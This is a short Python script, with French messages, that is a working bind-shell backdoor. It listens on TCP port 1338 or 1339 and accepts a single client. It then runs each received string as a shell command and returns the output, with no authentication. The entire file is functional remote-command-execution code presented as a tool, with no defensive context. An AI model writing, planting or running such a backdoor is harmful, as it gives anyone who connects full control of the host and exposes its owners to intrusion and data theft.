#!/usr/bin/env python
# --*-- coding:UTF-8 --*--

import socket
import subprocess

host = ''
port = 1338
mot = ""
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try :
        s.bind((host, port))
except:
    try:
        s.bind((host, port+1))
    except:
        print("Impossible de bind")
        exit(0)

s.listen(1)
client, adresse = s.accept()
client.send(b"Machine connecte")
print(f'Machine connectée {adresse}')

while 1:
    received = client.recv(1024).decode('utf8')
    if received == 'quit()':
        client.close()
        break
    proc2 = subprocess.Popen(received, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = proc2.stdout.read() + proc2.stderr.read()
    client.send(output)

s.close()
